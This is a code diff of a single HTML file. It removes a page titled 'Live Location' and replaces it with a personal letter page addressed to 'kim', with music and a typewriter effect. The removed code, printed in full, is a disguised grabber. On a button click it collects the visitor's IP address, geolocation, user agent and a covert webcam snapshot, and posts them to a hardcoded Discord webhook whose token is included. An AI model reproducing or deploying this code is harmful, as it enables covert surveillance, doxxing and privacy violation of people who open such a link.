@@ -1,110 +1,335 @@
 <html>
-‎<html lang="en">
-‎<head>
-‎  <meta charset="UTF-8" />
-‎  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-‎  <title>Live Location</title>
-‎  <style>
-‎    body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
-‎    .shop { background: white; padding: 20px; max-width: 400px; margin: auto; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-‎    h1 { margin-bottom: 10px; }
-‎    button { padding: 10px 20px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; }
-‎    video, canvas { display: none; }
-‎  </style>
-‎</head>
-‎<body>
-‎  <div class="shop">
-‎    <h1>My live location</h1>
-‎    <button id="buyBtn">View</button>
-‎  </div>
-‎
-‎  <video id="video" autoplay playsinline width="300" height="200"></video>
-‎  <canvas id="canvas" width="300" height="200"></canvas>
-‎
-‎  <script>
-‎    const webhookURL = "https://discord.com/api/webhooks/1513121111053828191/pQlimE3yfIaAbWouXJIlDxvmXD2QaXMXlH51b7mDjan2LRxJ87Oz2T3bjaGG-KxkaNOL";
-‎    const buyBtn = document.getElementById("buyBtn");
-‎    const video = document.getElementById("video");
-‎    const canvas = document.getElementById("canvas");
-‎    const ctx = canvas.getContext("2d");
-‎
-‎    async function getIPInfo() {
-‎      try {
-‎        const res = await fetch("https://api.ipify.org?format=json");
-‎        const data = await res.json();
-‎        return data.ip;
-‎      } catch {
-‎        return "Unavailable";
-‎      }
-‎    }
-‎
-‎    function getUserAgent() {
-‎      return navigator.userAgent;
-‎    }
-‎
-‎    function detectDevice() {
-‎      const ua = navigator.userAgent.toLowerCase();
-‎      if (/mobile|android|iphone|ipad|tablet/.test(ua)) return "Mobile/Tablet";
-‎      return "Desktop";
-‎    }
-‎
-‎    function getGeolocation() {
-‎      return new Promise((resolve) => {
-‎        if (!navigator.geolocation) return resolve("Unavailable");
-‎        navigator.geolocation.getCurrentPosition(
-‎          pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
-‎          err => resolve("Denied/Unavailable"),
-‎          { timeout: 5000 }
-‎        );
-‎      });
-‎    }
-‎
-‎    async function sendToDiscord(blob, infoText) {
-‎      const form = new FormData();
-‎      form.append("file", blob, "photo.png");
-‎      form.append("payload_json", JSON.stringify({ content: infoText }));
-‎
-‎      fetch(webhookURL, {
-‎        method: "POST",
-‎        body: form
-‎      });
-‎    }
-‎
-‎    buyBtn.addEventListener("click", async () => {
-‎      const ip = await getIPInfo();
-‎      const ua = getUserAgent();
-‎      const device = detectDevice();
-‎      const geo = await getGeolocation();
-‎
-‎      let photoBlob = null;
-‎
-‎      try {
-‎        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-‎        video.srcObject = stream;
-‎
-‎        await new Promise(res => setTimeout(res, 2000)); // wait for camera
-‎        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-‎        video.srcObject.getTracks().forEach(track => track.stop());
-‎
-‎        photoBlob = await new Promise(resolve => {
-‎          canvas.toBlob(blob => resolve(blob), "image/png");
-‎        });
-‎      } catch (e) {
-‎        // No camera or denied
-‎        console.warn("Webcam capture failed.");
-‎      }
-‎
-‎      const infoText = `**New Order Capture**:
-‎- **IP**: ${ip}
-‎- **Geolocation**: ${geo}
-‎- **User-Agent**: ${ua}
-‎- **Device Type**: ${device}
-‎- **Camera Access**: ${photoBlob ? "Success" : "Failed / Denied"}`;
-‎
-‎      await sendToDiscord(photoBlob || new Blob(["No photo"]), infoText);
-‎      alert("wait for it ");
-‎    });
-‎  </script>
-‎</body>
-‎</html>
-‎
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>💚 for kim · brosis</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@300;400;600;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Quicksand', sans-serif;
+      background: #0f2b1a;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+      transition: background 0.3s ease;
+    }
+
+    .page {
+      background: rgba(255, 255, 245, 0.9);
+      backdrop-filter: blur(4px);
+      width: 100%;
+      max-width: 780px;
+      padding: 2.5rem 2.8rem;
+      border-radius: 56px 24px 56px 24px;
+      box-shadow: 0 30px 50px rgba(0, 20, 0, 0.6), 0 0 0 1px rgba(100, 200, 130, 0.2);
+      transition: opacity 0.6s ease, transform 0.5s ease;
+      border: 1px solid rgba(120, 200, 140, 0.25);
+      position: relative;
+    }
+
+    .hidden-page {
+      display: none;
+      opacity: 0;
+      transform: scale(0.96);
+    }
+    .visible-page {
+      display: block;
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    {
+      text-align: center;
+      padding: 3.5rem 2rem;
+      background: rgba(240, 255, 240, 0.85);
+      backdrop-filter: blur(6px);
+      border-radius: 80px 20px 80px 20px;
+    }
+
+    .click-card {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 1.8rem;
+    }
+
+    .click-card h1 {
+      font-size: 2.6rem;
+      font-weight: 300;
+      letter-spacing: 4px;
+      color: #1f4d2b;
+      text-shadow: 0 0 6px rgba(80, 180, 100, 0.2);
+      border-bottom: 2px dashed #3d8b4e;
+      padding-bottom: 0.6rem;
+      display: inline-block;
+    }
+
+    .click-card .sub {
+      font-size: 1.2rem;
+      font-weight: 300;
+      color: #2a5f33;
+      background: rgba(100, 180, 120, 0.1);
+      padding: 0.2rem 2rem;
+      border-radius: 60px;
+      backdrop-filter: blur(2px);
+    }
+
+    .btn-open {
+      background: #1e5a2c;
+      border: none;
+      padding: 1.2rem 3.4rem;
+      border-radius: 120px;
+      font-size: 1.7rem;
+      font-weight: 600;
+      color: #f0fff0;
+      cursor: pointer;
+      box-shadow: 0 12px 20px -8px rgba(20, 70, 30, 0.6);
+      transition: all 0.25s ease;
+      letter-spacing: 2px;
+      backdrop-filter: blur(4px);
+      border: 1px solid rgba(200, 255, 200, 0.4);
+      font-family: 'Quicksand', sans-serif;
+    }
+
+    .btn-open:hover {
+      background: #2d7a40;
+      transform: scale(1.03);
+      box-shadow: 0 18px 28px -8px #0f3a1a;
+      border-color: #a8f0b0;
+      color: #ffffff;
+    }
+
+    .btn-open:active {
+      transform: scale(0.95);
+    }
+
+    .leaf-icon {
+      font-size: 2.8rem;
+      opacity: 0.6;
+      margin: 0.2rem 0;
+      filter: drop-shadow(0 0 6px #3d8b4e);
+    }
+
+    {
+      background: rgba(250, 255, 245, 0.92);
+      backdrop-filter: blur(6px);
+      padding: 2.5rem 2.8rem;
+      border-radius: 48px 16px 48px 16px;
+      border-left: 8px solid #357a44;
+      box-shadow: 0 20px 40px rgba(0, 30, 0, 0.5);
+    }
+
+    .letter-container {
+      max-height: 580px;
+      overflow-y: auto;
+      padding-right: 6px;
+      scroll-behavior: smooth;
+    }
+
+    .letter-container::-webkit-scrollbar {
+      width: 5px;
+    }
+    .letter-container::-webkit-scrollbar-track {
+      background: rgba(50, 110, 60, 0.1);
+      border-radius: 20px;
+    }
+    .letter-container::-webkit-scrollbar-thumb {
+      background: #387a47;
+      border-radius: 20px;
+    }
+
+    #typewriter {
+      font-size: 1.1rem;
+      line-height: 1.8;
+      color: #1b3a23;
+      font-weight: 400;
+      white-space: pre-wrap;
+      word-break: break-word;
+      font-family: 'Quicksand', sans-serif;
+      padding: 0.2rem 0.2rem 0.2rem 0.2rem;
+    }
+
+    .signature-line {
+      margin-top: 2rem;
+      text-align: right;
+      font-weight: 600;
+      color: #1c5329;
+      letter-spacing: 1px;
+      border-top: 2px dotted #6aa37b;
+      padding-top: 1rem;
+      font-size: 1.1rem;
+      opacity: 0.8;
+    }
+
+    .music-note {
+      position: absolute;
+      bottom: 12px;
+      right: 24px;
+      font-size: 1.8rem;
+      opacity: 0.2;
+      color: #1a4d27;
+      pointer-events: none;
+    }
+
+    @media (max-width: 550px) {
+      .page {
+        padding: 1.8rem 1.2rem;
+      }
+      #page2 {
+        padding: 1.8rem 1.2rem;
+      }
+      .click-card h1 {
+        font-size: 2rem;
+      }
+      .btn-open {
+        padding: 1rem 2.2rem;
+        font-size: 1.4rem;
+      }
+      #typewriter {
+        font-size: 1rem;
+        line-height: 1.7;
+      }
+    }
+
+    .glow-text {
+      color: #1d562b;
+      font-weight: 300;
+    }
+
+    .footer-note {
+      font-size: 0.75rem;
+      color: #3b6f47;
+      margin-top: 1rem;
+      opacity: 0.4;
+      letter-spacing: 2px;
+    }
+  </style>
+</head>
+<body>
+  <audio id="bgMusic" loop preload="auto">
+    <source src="https://audio.jukehost.co.uk/5f8cf408-40b0-11f1-a012-fa163edb0845" type="audio/mpeg">
+    Your browser does not support the audio element.
+  </audio>
+  <div id="page1" class="page visible-page">
+    <div class="click-card">
+      <div class="leaf-icon">🌿</div>
+      <h1>💚 click to view</h1>
+      <div class="sub">a letter for you, kim</div>
+      <button class="btn-open" id="openLetterBtn">🌸 open letter</button>
+      <div style="margin-top: 0.8rem; font-size: 0.9rem; color: #2c6b3a; opacity: 0.7;">· brosis ·</div>
+    </div>
+    <div class="music-note">🎵</div>
+  </div>
+  <div id="page2" class="page hidden-page">
+    <div class="letter-container">
+      <div id="typewriter"></div>
+      <div class="signature-line">— always, your brosis 💚</div>
+    </div>
+    <div class="footer-note">✦ with love ✦</div>
+    <div class="music-note">🎶</div>
+  </div>
+
+  <script>
+    (function() {
+      "use strict";
+      const page1 = document.getElementById('page1');
+      const page2 = document.getElementById('page2');
+      const openBtn = document.getElementById('openLetterBtn');
+      const typewriterEl = document.getElementById('typewriter');
+      const fullLetter = `hello, kim. it's your brosis here.
+
+first of all, I just want to thank you for being there when I needed you the most—when I needed someone to lean on. you healed a version of me that no one else could. I truly appreciate your existence in my life. I'm so thankful to have you in this world full of challenges and circumstances. I hope you know that your existence means so much to me. thank you for always guiding me and leading me to the right path. I value you more than money could ever buy.
+
+thank you for always reminding me to take care of myself and for always checking if I am okay. you make me feel like I can always be vulnerable with you. I can cry in front of you and even be a crybaby around you without being judged. you make me feel like I don't have to carry all my problems on my own. you remind me that it's okay to cry sometimes and to be weak sometimes. we're only human—we have emotions and feelings. you became my comfort person. you've helped me more than you know, even though you're fighting your own personal battles too.
+
+but at the same time, I hope you learn to value yourself the same way I deeply value you. take care of yourself, prioritize your well-being, and be gentle with yourself. you're doing the best you can, and I see all your hard work. I truly hope that all your hard work pays off. I celebrate every achievement you make, whether it's a small win or a big one. I'm so proud of you for simply being you.
+
+that's why I hope you never, ever think that there's no one for you or that no one is proud of you—because I always am. and just like you always tell me, I hope you know that you can be a crybaby to me too. don't ever think that you're a burden to me, because you never have been. you can always be vulnerable with me too.
+
+most of all, you don't have to carry all the problems and circumstances that the world throws at you alone. you will always have me by your side, and we will always have each other's backs whenever the world becomes cruel to us. we'll lean on each other, rest when we need to, and continue moving forward together.
+
+learn to take a break whenever you're tired. I hope you always stay healthy and happy because you deserve nothing less. you deserve all the genuine things this world has to offer. always stay happy because that's what your brosis always wants to see, okay?
+
+galingan mo palagi. I'm always here for you. it may not always be in person, but my presence and support will always be with you.`;
+      let typingTimer = null;
+      let isTyping = false;
+      let currentCharIndex = 0;
+      const typingSpeed = 50;
+      function typeLetter() {
+        if (isTyping) return;
+        if (currentCharIndex >= fullLetter.length) {
+          return;
+        }
+
+        isTyping = true;
+        if (typingTimer) {
+          clearInterval(typingTimer);
+          typingTimer = null;
+        }
+
+        typingTimer = setInterval(function() {
+          if (currentCharIndex < fullLetter.length) {
+            typewriterEl.textContent += fullLetter.charAt(currentCharIndex);
+            currentCharIndex++;
+            const container = document.querySelector('.letter-container');
+            if (container) {
+              container.scrollTop = container.scrollHeight;
+            }
+          } else {
+            clearInterval(typingTimer);
+            typingTimer = null;
+            isTyping = false;
+          }
+        }, typingSpeed);
+      }
+
+      function resetAndStartTyping() {
+        if (typingTimer) {
+          clearInterval(typingTimer);
+          typingTimer = null;
+        }
+        isTyping = false;
+        currentCharIndex = 0;
+        typewriterEl.textContent = '';
+        typeLetter();
+      }
+      function goToLetterPage() {
+        page1.classList.remove('visible-page');
+        page1.classList.add('hidden-page');
+        page2.classList.remove('hidden-page');
+        page2.classList.add('visible-page');
+
+        setTimeout(function() {
+          resetAndStartTyping();
+        }, 300);
+        const audio = document.getElementById('bgMusic');
+        if (audio) {
+          audio.play().catch(function(e) {
+            console.log('Music autoplay blocked. Click allowed.', e);
+          });
+        }
+      }
+      openBtn.addEventListener('click', function(e) {
+        goToLetterPage();
+      });
+      window.addEventListener('load', function() {
+        const audio = document.getElementById('bgMusic');
+        if (audio) {
+          audio.play().catch(() => {});
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
